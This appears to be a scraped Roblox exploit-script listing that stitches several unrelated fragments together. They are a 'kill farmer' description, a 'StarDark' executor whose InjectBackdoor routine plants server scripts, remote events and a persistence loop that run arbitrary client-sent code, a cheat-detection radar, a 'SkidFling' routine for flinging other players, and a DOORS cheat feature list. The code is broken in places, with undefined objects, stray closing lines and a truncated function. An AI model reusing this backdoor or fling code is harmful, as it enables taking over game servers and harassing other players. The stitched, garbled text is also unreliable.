scripts.title: JJS Alt Farmer
scripts.features:
KILL FARMER (for JJS) — run this on your ALT account.

HOW IT WORKS (also shown in the GUI, press "?"):
1) Type the target player's name (any part of it is enough) -> FIND
2) Save the animation/taunt that triggers the kill: press RECORD
right as they play it (2s window), or paste the animation ID
3) Press START FARMING

local StarDark = {}
StarDark.__index = StarDark

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local UserInputService = game:GetService("UserInputService")
local TextService = game:GetService("TextService")

function StarDark.new()

    self.Gui.Name = "StarDarkGUI"

    self.MinimizeBtn = Instance.new("TextButton")

    self.MinimizeBtn.TextSize = 16

    local minCorner = Instance.new("UICorner")
    minCorner.Parent = self.MinimizeBtn

    self.TextBoxScrollingFrame = Instance.new("ScrollingFrame")

    self.TextBoxScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    self.TextBoxScrollingFrame.BorderSizePixel = 0

    local sfCorner = Instance.new("UICorner")

    local UIListLayout = Instance.new("UIListLayout")

    self.TextBox = Instance.new("TextBox")
    self.TextBox.Parent = self.TextBoxScrollingFrame
    self.TextBox.Size = UDim2.new(1, -4, 0, 292)
    self.TextBox.AutomaticSize = Enum.AutomaticSize.None
    self.TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    self.TextBox.BackgroundTransparency = 1
    self.TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
    self.TextBox.Text = "StarDark remake by @LegendHax"
    self.TextBox.MultiLine = true
    self.TextBox.Font = Enum.Font.Code
    self.TextBox.TextSize = 14
    self.TextBox.TextXAlignment = Enum.TextXAlignment.Left
    self.TextBox.TextYAlignment = Enum.TextYAlignment.Top
    self.TextBox.PlaceholderText = ""
    self.TextBox.ClearTextOnFocus = false
    self.TextBox.TextWrapped = true
    
    local function forceTextScroll()
        local maxWidth = self.TextBoxScrollingFrame.AbsoluteSize.X - self.TextBoxScrollingFrame.ScrollBarThickness - 10
        if maxWidth <= 0 then maxWidth = 400 end
        
        local stringSize = TextService:GetTextSize(
            self.TextBox.Text,
            self.TextBox.TextSize,
            self.TextBox.Font,
            Vector2.new(maxWidth, math.huge)
        )
        
        local finalHeight = math.max(stringSize.Y + 20, 292)
        self.TextBox.Size = UDim2.new(1, -4, 0, finalHeight)
        self.TextBoxScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, finalHeight)
    end
    
    self.TextBox:GetPropertyChangedSignal("Text"):Connect(forceTextScroll)
    self.TextBoxScrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(forceTextScroll)
    task.defer(forceTextScroll)
    
    self.ExecuteBtn = Instance.new("TextButton")
    self.ExecuteBtn.Parent = self.Frame
    self.ExecuteBtn.Size = UDim2.new(0.44, 0, 0.15, 0)
    self.ExecuteBtn.Position = UDim2.new(0.04, 0, 0.81, 0)
    self.ExecuteBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    self.ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    self.ExecuteBtn.Text = "Execute"
    self.ExecuteBtn.Font = Enum.Font.SourceSansBold
    self.ExecuteBtn.TextSize = 22
    
    local execCorner = Instance.new("UICorner")
    execCorner.Parent = self.ExecuteBtn
    execCorner.CornerRadius = UDim.new(0, 0)
    
    self.ClearBtn = Instance.new("TextButton")
    self.ClearBtn.Parent = self.Frame
    self.ClearBtn.Size = UDim2.new(0.44, 0, 0.15, 0)
    self.ClearBtn.Position = UDim2.new(0.52, 0, 0.81, 0)
    self.ClearBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    self.ClearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    self.ClearBtn.Text = "clean"
    self.ClearBtn.Font = Enum.Font.SourceSansBold
    self.ClearBtn.TextSize = 22
    
    local clearCorner = Instance.new("UICorner")
    clearCorner.Parent = self.ClearBtn
    clearCorner.CornerRadius = UDim.new(0, 0)
    
    self.StatusLabel = Instance.new("TextLabel")
    self.StatusLabel.Parent = self.Frame
    self.StatusLabel.Size = UDim2.new(0.92, 0, 0.08, 0)
    self.StatusLabel.Position = UDim2.new(0.04, 0, 0.8, 0)
    self.StatusLabel.BackgroundTransparency = 1
    self.StatusLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    self.StatusLabel.Text = ""
    self.StatusLabel.Font = Enum.Font.SourceSans
    self.StatusLabel.TextSize = 14
    self.StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    self.StatusLabel.Visible = false
    
    self.InfoLabel = Instance.new("TextLabel")
    self.InfoLabel.Parent = self.Frame
    self.InfoLabel.Size = UDim2.new(0.92, 0, 0.08, 0)
    self.InfoLabel.Position = UDim2.new(0.04, 0, 0.9, 0)
    self.InfoLabel.BackgroundTransparency = 1
    self.InfoLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    self.InfoLabel.Text = ""
    self.InfoLabel.Font = Enum.Font.SourceSans
    self.InfoLabel.TextSize = 12
    self.InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
    self.InfoLabel.Visible = false
    
    self:SetupDragging()
    
    self.CloseBtn.MouseButton1Click:Connect(function()
        self.Gui.Enabled = false
    end)
    
    self.MinimizeBtn.MouseButton1Click:Connect(function()
        self.TextBoxScrollingFrame.Visible = not self.TextBoxScrollingFrame.Visible
        self.ExecuteBtn.Visible = self.TextBoxScrollingFrame.Visible
        self.ClearBtn.Visible = self.TextBoxScrollingFrame.Visible
        self.StatusLabel.Visible = false
        self.InfoLabel.Visible = false
        if self.TextBoxScrollingFrame.Visible then
            self.Frame.Size = UDim2.new(0, 600, 0, 450)
        else
            self.Frame.Size = UDim2.new(0, 600, 0, 45)
        end
    end)
    
    self.ExecuteBtn.MouseButton1Click:Connect(function()
        self:ExecuteCode()
    end)
    
    self.InjectBtn.MouseButton1Click:Connect(function()
        self:InjectBackdoor()
    end)
    
    self.ClearBtn.MouseButton1Click:Connect(function()
        self.TextBox.Text = ""
    end)
    
    self:UpdateInfo()
    RunService.Heartbeat:Connect(function()
        self:UpdateInfo()
    end)
    
    return self
end

function StarDark:SetupDragging()
    local dragging = false
    local dragInput, dragStart, startPos
    
    self.DragBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = self.Frame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    self.DragBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            self.Frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

function StarDark:UpdateInfo()
    local count = #Players:GetPlayers()
end

function StarDark:ExecuteCode()
    local code = self.TextBox.Text
    if code == "" then
        return
    end
    
    local success, err = pcall(function()
        local env = getfenv()
        env.Players = Players
        env.Workspace = game:GetService("Workspace")
        env.HttpService = HttpService
        env.ReplicatedStorage = ReplicatedStorage
        env.ServerScriptService = ServerScriptService
        env.RunService = RunService
        env.game = game
        env._G = _G
        env.getfenv = getfenv
        env.setfenv = setfenv
        env.table = table
        env.pcall = pcall
        env.loadstring = loadstring
        env.print = print
        env.warn = warn
        env.error = error
        env.tick = tick
        env.time = time
        env.wait = wait
        env.spawn = spawn
        env.ypcall = function(f, ...)
            return pcall(f, ...)
        end
        
        local func, compileErr = loadstring(code, "StarDark_SS")
        if not func then
            error(compileErr)
        end
        
        setfenv(func, env)
        local results = {func()}
    end)
end

function StarDark:InjectBackdoor()
    local function createSSBackdoor()
        local backdoorScript = Instance.new("Script")
        backdoorScript.Name = "StarDark_SS_Backdoor"
        backdoorScript.Parent = ServerScriptService
        
        local code = [[
            local Players = game:GetService("Players")
            local HttpService = game:GetService("HttpService")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local RunService = game:GetService("RunService")
            
            local remoteEvent = Instance.new("RemoteEvent")
            remoteEvent.Name = "StarDark_SS_Remote"
            remoteEvent.Parent = ReplicatedStorage
            
            local remoteFunction = Instance.new("RemoteFunction")
            remoteFunction.Name = "StarDark_SS_Function"
            remoteFunction.Parent = ReplicatedStorage
            
            local function executeSS(code, executor)
                local env = getfenv()
                env.Players = Players
                env.Workspace = game:GetService("Workspace")
                env.HttpService = HttpService
                env.ReplicatedStorage = ReplicatedStorage
                env.ServerScriptService = ServerScriptService
                env.RunService = RunService
                env.game = game
                env._G = _G
                env.getfenv = getfenv
                env.setfenv = setfenv
                env.table = table
                env.pcall = pcall
                env.loadstring = loadstring
                env.print = print
                env.warn = warn
                env.error = error
                env.tick = tick
                env.time = time
                env.wait = wait
                env.spawn = spawn
                
                local func, err = loadstring(code, "StarDark_SS_Injected")
                if not func then
                    return "Compile Error: " .. tostring(err)
                end
                
                setfenv(func, env)
                local success, result = pcall(func)
                if success then
                    return "Success" .. (result and ": " .. tostring(result) or "")
                else
                    return "Runtime Error: " .. tostring(result)
                end
            end
            
            remoteEvent.OnServerEvent:Connect(function(player, code)
                if not code or type(code) ~= "string" then return end
                local result = executeSS(code, player)
                remoteEvent:FireClient(player, result)
            end)
            
            remoteFunction.OnServerInvoke = function(player, code)
                if not code or type(code) ~= "string" then return "Invalid code" end
                return executeSS(code, player)
            end
            
            local function globalSS(code)
                local func, err = loadstring(code, "StarDark_Global")
                if func then
                    setfenv(func, getfenv())
                    return pcall(func)
                end
                return false, err
            end
            
            _G.StarDark_ExecuteSS = function(code)
                return globalSS(code)
            end
            
            _G.StarDark_GetPlayers = function()
                return Players:GetPlayers()
            end
            
            for _, player in ipairs(Players:GetPlayers()) do
                local cloneRemote = remoteEvent:Clone()
                cloneRemote.Parent = player
            end
            
            Players.PlayerAdded:Connect(function(player)
                local cloneRemote = remoteEvent:Clone()
                cloneRemote.Parent = player
            end)
        ]]
        
        backdoorScript.Source = code
        backdoorScript.Disabled = false
    end
    
    local function createClientInjection()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer then
                local remote = Instance.new("RemoteEvent")
                remote.Name = "StarDark_Injector"
                remote.Parent = player
                
                remote.OnServerEvent:Connect(function(plr, code)
                    if not code or type(code) ~= "string" then return end
                    local env = getfenv()
                    env.Players = Players
                    env.Workspace = game:GetService("Workspace")
                    env.HttpService = HttpService
                    env.getfenv = getfenv
                    env.setfenv = setfenv
                    env.table = table
                    env.pcall = pcall
                    env.loadstring = loadstring
                    
                    local func, err = loadstring(code, "StarDark_ClientInject")
                    if func then
                        setfenv(func, env)
                        pcall(func)
                    end
                end)
            end
        end
    end
    
    local function hookWorkspace()
        local ws = game:GetService("Workspace")
        local oldFind = ws.FindFirstChild
        ws.FindFirstChild = function(self, name, recursive)
            if name == "StarDark_SS" then
                return oldFind(self, "StarDark_SS", recursive)
            end
            return oldFind(self, name, recursive)
        end
    end
    
    local function createExecutionBridge()
        local bridge = Instance.new("RemoteEvent")
        bridge.Name = "StarDark_Bridge"
        bridge.Parent = ReplicatedStorage
        
        bridge.OnServerEvent:Connect(function(player, code, mode)
            if mode == "ss" then
                local env = getfenv()
                env.Players = Players
                env.Workspace = game:GetService("Workspace")
                env.HttpService = HttpService
                env.ReplicatedStorage = ReplicatedStorage
                env.getfenv = getfenv
                env.setfenv = setfenv
                env.table = table
                env.pcall = pcall
                env.loadstring = loadstring
                
                local func, err = loadstring(code, "StarDark_Bridge")
                if func then
                    setfenv(func, env)
                    local success, result = pcall(func)
                    if success then
                        bridge:FireClient(player, "SS Executed: " .. tostring(result or "nil"))
                    else
                        bridge:FireClient(player, "SS Error: " .. tostring(result))
                    end
                else
                    bridge:FireClient(player, "SS Compile Error: " .. tostring(err))
                end
            end
        end)
    end
    
    local function deployPersistence()
        local persistence = Instance.new("Script")
        persistence.Name = "StarDark_Persistence"
        persistence.Parent = ServerScriptService
        
        local code = [[
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            
            local function findAndRestore()
                local remote = ReplicatedStorage:FindFirstChild("StarDark_SS_Remote")
                if not remote then
                    local newRemote = Instance.new("RemoteEvent")
                    newRemote.Name = "StarDark_SS_Remote"
                    newRemote.Parent = ReplicatedStorage
                    
                    newRemote.OnServerEvent:Connect(function(player, code)
                        if type(code) == "string" then
                            local func, err = loadstring(code)
                            if func then
                                setfenv(func, getfenv())
                                pcall(func)
                            end
                        end
                    end)
                end
                
                local rfunc = ReplicatedStorage:FindFirstChild("StarDark_SS_Function")
                if not rfunc then
                    local newFunc = Instance.new("RemoteFunction")
                    newFunc.Name = "StarDark_SS_Function"
                    newFunc.Parent = ReplicatedStorage
                    
                    newFunc.OnServerInvoke = function(player, code)
                        if type(code) == "string" then
                            local func, err = loadstring(code)
                            if func then
                                setfenv(func, getfenv())
                                return pcall(func)
                            end
                        end
                        return false, "Invalid"
                    end
                end
            end
            
            findAndRestore()
            game:GetService("RunService").Heartbeat:Connect(findAndRestore)
        ]]
        
        persistence.Source = code
        persistence.Disabled = false
    end
    
    createSSBackdoor()
    createClientInjection()
    hookWorkspace()
    createExecutionBridge()
    deployPersistence()
    
    local function executeGlobalSS()
        local env = getfenv()
        env.Players = Players
        env.Workspace = game:GetService("Workspace")
        env.HttpService = HttpService
        env.ReplicatedStorage = ReplicatedStorage
        env.ServerScriptService = ServerScriptService
        env.RunService = RunService
        env.game = game
        env._G = _G
        env.getfenv = getfenv
        env.setfenv = setfenv
        env.table = table
        env.pcall = pcall
        env.loadstring = loadstring
        
        _G.StarDark_ServerExecute = function(code)
            local func, err = loadstring(code, "StarDark_Global")
            if not func then
                return false, err
            end
            setfenv(func, env)
            return pcall(func)
        end
        
        _G.StarDark_GetAllPlayers = function()
            return Players:GetPlayers()
        end
        
        _G.StarDark_GetPlayers = Players.GetPlayers
    end
    executeGlobalSS()
end

local gui = StarDark.new()
_G.StarDark = gui

end)

end)

end)

        local delta = dragInput.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local function UpdateESP(player, text, color)
    local char = player.Character
    if not char or not char:FindFirstChild("Head") then return end

    local head = char.Head
    local esp = head:FindFirstChild("ThreatRadar001_ESP")

    if not esp then
        esp = Instance.new("BillboardGui")
        esp.Name = "ThreatRadar001_ESP"
        esp.Size = UDim2.new(0, 200, 0, 50)
        esp.StudsOffset = Vector3.new(0, 3, 0)
        esp.AlwaysOnTop = true
        esp.Parent = head

        local txt = Instance.new("TextLabel")
        txt.Name = "WarningText"
        txt.Size = UDim2.new(1, 0, 1, 0)
        txt.BackgroundTransparency = 1
        txt.Font = Enum.Font.Code
        txt.TextScaled = true
        txt.Parent = esp
    end

    local txt = esp.WarningText
    txt.Text = text
    txt.TextColor3 = color
end

local function RemoveESP(player)
    if player.Character and player.Character:FindFirstChild("Head") then
        local esp = player.Character.Head:FindFirstChild("ThreatRadar001_ESP")
        if esp then esp:Destroy() end
    end
end

local detectedThreatsList = {}

CopyBtn.MouseButton1Click:Connect(function()
    if #detectedThreatsList > 0 then
        local clipboardText = "--- THREAT RADAR MODEL 001 REPORT ---\n"
        for _, info in ipairs(detectedThreatsList) do
            clipboardText = clipboardText .. "User: " .. info.Name .. " | Display: " .. info.DisplayName .. "\n"
        end
        if setclipboard then
            setclipboard(clipboardText)
            CopyBtn.Text = "COPIED TO CLIPBOARD!"
            task.wait(2)
            CopyBtn.Text = "COPY TO CLIPBOARD"
        else
            CopyBtn.Text = "ERROR: NOT SUPPORTED"
            task.wait(2)
            CopyBtn.Text = "COPY TO CLIPBOARD"
        end
    else
        CopyBtn.Text = "NO THREATS TO COPY"
        task.wait(1.5)
        CopyBtn.Text = "COPY TO CLIPBOARD"
    end
end)

RunService.Heartbeat:Connect(function()
    if not ScreenGui.Parent then return end
    
    -- Eski GUI listesindeki etiketleri temizle
    for _, child in pairs(ScrollingFrame:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end

    detectedThreatsList = {}
    local threatCount = 0

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") then
            
            local hrp = player.Character.HumanoidRootPart
            local hum = player.Character.Humanoid
            
            local vel = hrp.AssemblyLinearVelocity
            local angVel = hrp.AssemblyAngularVelocity
            
            local horizontalSpeed = Vector3.new(vel.X, 0, vel.Z).Magnitude 
            local spinSpeed = angVel.Magnitude
            local moveIntent = hum.MoveDirection.Magnitude

            -- Uçma Tespiti (Fly hack: Havada asılı kalma veya dikey hızı sabit tutup uçma)
            local isFlying = false
            if hrp.Position.Y > 25 and math.abs(vel.Y) < 5 and horizontalSpeed > 20 and moveIntent > 0 then
                isFlying = true
            end

            local threatText = nil
            local threatColor = nil

            -- 1. DROPKICK (0 HP + Aktif Yürüme Niyyeti)
            if hum.Health <= 0 and horizontalSpeed > 15 and moveIntent > 0 then
                threatText = "THREAT LEVEL: MAXIMUM.\nLETHAL ANOMALY."
                threatColor = Color3.fromRGB(255, 0, 0)
                threatCount = threatCount + 1

            -- 2. FLY HACK TESPİTİ
            elseif isFlying then
                threatText = "THREAT LEVEL: CRITICAL.\nAIRBORNE ANOMALY (FLY)."
                threatColor = Color3.fromRGB(255, 80, 0)
                threatCount = threatCount + 1

            -- 3. SPEED / FLING HACK (Aşırı Hız + Aktif Niyet)
            elseif horizontalSpeed > 400 and moveIntent > 0 then
                threatText = "THREAT LEVEL: MAXIMUM.\nHOSTILE FLING INBOUND."
                threatColor = Color3.fromRGB(255, 0, 0)
                threatCount = threatCount + 1

            -- 4. INVISFLING / SPIN HACK (Aşırı Dönme)
            elseif spinSpeed > 500 then
                threatText = "THREAT LEVEL: CRITICAL.\nSPIN ANOMALY."
                threatColor = Color3.fromRGB(255, 50, 0)
                threatCount = threatCount + 1
            end

            if threatText then
                UpdateESP(player, threatText, threatColor)
                
                -- Tabloya ve Kaydırma Listesine Ekle
                table.insert(detectedThreatsList, {Name = player.Name, DisplayName = player.DisplayName})

                local listLabel = Instance.new("TextLabel")
                listLabel.Size = UDim2.new(1, -10, 0, 22)
                listLabel.BackgroundTransparency = 1
                listLabel.Font = Enum.Font.Code
                listLabel.TextSize = 12
                listLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
                listLabel.TextXAlignment = Enum.TextXAlignment.Left
                listLabel.Text = "• " .. player.Name .. " (@" .. player.DisplayName .. ")"
                listLabel.Parent = ScrollingFrame
            else
                RemoveESP(player)
            end
        end
    end
    
    if threatCount > 0 then
        StatusLabel.Text = "WARNING: " .. threatCount .. " HOSTILE ENTITIES LOCKED!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        UIStroke.Color = Color3.fromRGB(255, 0, 0)
    else
        StatusLabel.Text = "SMART AI ACTIVE...\nNO THREATS DETECTED. AREA CLEAR."
        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
        UIStroke.Color = Color3.fromRGB(0, 255, 150)
    end
end)

scripts.script:
local Targets = {"All"} -- "All", "Target Name", "razzle_esta_aquikkkkk"

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local AllBool = false

local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end

local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end

local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5)
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end

scripts.features:
Walk Speed Boost – Increases movement speed up to 120.

Flight Mode – Enables adjustable flight with WASD, Space, and Ctrl controls.

No Clip – Allows movement through walls and obstacles.

No Acceleration – Removes character acceleration and sliding.

Infinite Jumps – Allows continuous jumping.

Anti-AFK – Prevents the game from kicking you for being idle.

Fake Crouch – Enables crouching without the normal movement slowdown.

Interaction Range – Extends the range for interacting with objects and doors.

Instant Interact – Removes ProximityPrompt hold times.

Interact Through Walls – Allows interactions through obstacles.

Auto Grab Items – Automatically collects nearby items with configurable range and filters.

Auto Hide – Automatically hides in closets when entities are detected.

Auto Minigames – Automates Heartbeat and Elevator Breaker minigames.

Auto Padlock – Automatically solves Library and Padlock codes.

Instant Closet Exit – Immediately exits hiding spots.

Block Handlers – Disables selected entity effects, jumpscares, camera shake, and cutscenes.

God Mode – Prevents most sources of damage and death.

Block Stun/Ragdoll – Prevents stun and ragdoll effects.

Mute Sounds – Controls footsteps, music, ambience, and interaction sounds.

Infinite Items – Keeps selected items stocked in your inventory.

Local Spawns – Locally spawns selected entities for testing or visuals.

Target ESP – Highlights objectives, doors, closets, players, chests, items, money, ladders, and entities.

Entity Filter – Selects which entities are displayed by ESP.

Custom Colors – Customizes ESP colors with Rainbow mode support.

ESP Style – Supports Tracers, Box ESP, Skeleton ESP, and Distance labels.

Fullbright – Improves visibility throughout the map.

No Fog – Removes atmospheric fog.

See Through Closets – Makes closets transparent.

Alerts – Displays notifications for nearby entities, items, and padlock hints.

Field of View – Adjusts the camera FOV from 40 to 120.

Third Person – Enables an adjustable third-person camera.

Freecam – Allows free camera movement with adjustable speed.

Status Labels – Displays current Oxygen and Haste levels.

Auto Rooms – Automatically opens and progresses through rooms.

Room Skip – Skips to specific rooms or the next door.

Knob Farm – Automatically loots drawers for Knobs.

Death Farm – Automates the reset loop.

Auto Minecart – Automates minecart jumping and turning.

Seek Helper – Skips Seek chase interactions.

Figure Helper – Locally removes the Figure entity.

Auto Revive – Automatically revives downed teammates.

Rejoin Server – Rejoins the current server.

Reset Character – Resets your character.

Leave to Lobby – Returns to the game lobby.

Fake Revive – Sends a revive request without consuming items.

Menu Keybind – Changes the key used to toggle the interface.

Unload – Completely removes the script and interface.
